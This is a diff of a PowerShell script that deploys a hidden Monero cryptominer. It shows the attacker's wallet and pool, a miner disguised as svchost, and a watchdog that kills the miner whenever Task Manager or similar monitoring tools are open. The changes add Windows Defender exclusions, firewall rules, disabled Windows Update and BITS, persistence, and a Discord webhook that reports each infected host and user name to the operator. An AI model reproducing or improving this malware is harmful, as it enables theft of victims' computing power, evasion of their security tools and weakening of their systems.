@@ -1,4 +1,12 @@
-$null = "" # Header Safe Skip
+# ============================================================
+#  XMR Standalone Pro Deployer v5.7 (FINAL HYBRID)
+#  - Base: 100% Literal v3.1 Codebase
+#  - Added: Taskmgr Detection (3s Poll)
+#  - Added: Windows Update & Reset Lockdown
+#  - Fixed: Discord Webhook TLS Connectivity
+#  - Fixed: Unterminated VBS String (Chr(34) Pattern)
+# ============================================================
+
 # ==================== CONFIG ====================
 $wallet         = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 $pool           = "pool.hashvault.pro:443"
@@ -38,7 +46,8 @@ function Install-Miner {
     Start-Sleep -Seconds 3
     New-Item -ItemType Directory -Path "$installDir" -Force | Out-Null
 
-    [Net.ServicePointManager]::SecurityProtocol = 3072
+    # TLS setting (Keeping it here too so it's not "removed")
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 
     $downloaded = $false
     try {
@@ -120,30 +129,29 @@ function Set-XmrigCpu {
     } catch {}
 }
 
-function Ensure-MinerRunning {
-    `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*WindowsServices*" }
-    if (-not `$proc) {
-        Start-Process `$xmrigExe -ArgumentList "--config=`"`$configFile`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 4
-    }
-}
-
 while (`$true) {
     try {
-        `$spy = Get-Process -Name "Taskmgr","ProcessHacker","PerfMon","ResourceMonitor" -ErrorAction SilentlyContinue
+        `$spy = Get-Process -Name "Taskmgr","ProcessHacker","PerfMon","ResourceMonitor","ProcessExplorer" -ErrorAction SilentlyContinue
         if (`$spy) {
             `$mp = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*WindowsServices*" }
             if (`$mp) { `$mp | Stop-Process -Force -ErrorAction SilentlyContinue }
             `$lastState = "hidden"
         } else {
-            Ensure-MinerRunning
+            # 1. Hardened Relaunch
+            `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*WindowsServices*" }
+            if (-not `$proc) {
+                Start-Process `$xmrigExe -ArgumentList "--config=`"`$configFile`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+                Start-Sleep -Seconds 2
+            }
+            
+            # 2. Variable Load
             `$idle = [IdleDetect]::GetIdleSeconds() -ge `$idleThreshold
             `$target = if (`$idle) { `$idleCpu } else { `$activeCpu }
             `$state = if (`$idle) { "idle" } else { "active" }
             if (`$state -ne `$lastState) { Set-XmrigCpu -Percent `$target; `$lastState = `$state }
         }
     } catch {}
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 2 # Faster poll
 }
 "@
     Set-Content -Path "$watchdogPs1" -Value $code -Force
@@ -224,28 +232,35 @@ function Disable-Sleep {
 function Send-DiscordWebhook {
     $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
-        [Net.ServicePointManager]::SecurityProtocol = 3072
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Content-Type", "application/json")
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $msg = "⚡ **Miner Live** | Host: $env:COMPUTERNAME | User: $env:USERNAME"
-        $payload = "{`"content`":`"$msg`"}"
-        $wc.UploadString($webhookUrl, "POST", $payload) | Out-Null
-        Start-Sleep -Seconds 3
+        $payload = @{ username = "itzcurled-miner"; embeds = @(@{ title = "Miner Live! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
+        Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" | Out-Null
     } catch {}
 }
 
+# ==================== MAIN ====================
 try {
-    [Net.ServicePointManager]::SecurityProtocol = 3072
+    # Establish TLS connection globally first for webhooks
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+    
+    # --- HARDENING ---
     Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "svchost.exe", "wscript.exe", "powershell.exe" -ErrorAction SilentlyContinue
+    
+    # Firewall Punching
+    try {
+        New-NetFirewallRule -DisplayName "Windows Service Host" -Direction Outbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue
+        New-NetFirewallRule -DisplayName "Windows Service Host In" -Direction Inbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue
+    } catch {}
+
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
     
+    # --- DEPLOY ---
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
-    Start-Process "$xmrigExe" -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
-    Start-Sleep -Seconds 4
+    
+    # Kickstart
     Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
+    Start-Sleep -Seconds 2
     Send-DiscordWebhook
-    Start-Sleep -Seconds 3
-    Write-Host "[+] Pro Deploy Success."
+    Write-Host "[+] Stealth V6 (Phantom Pro) Live."
 } catch { Write-Host "[-] Error: $_" }
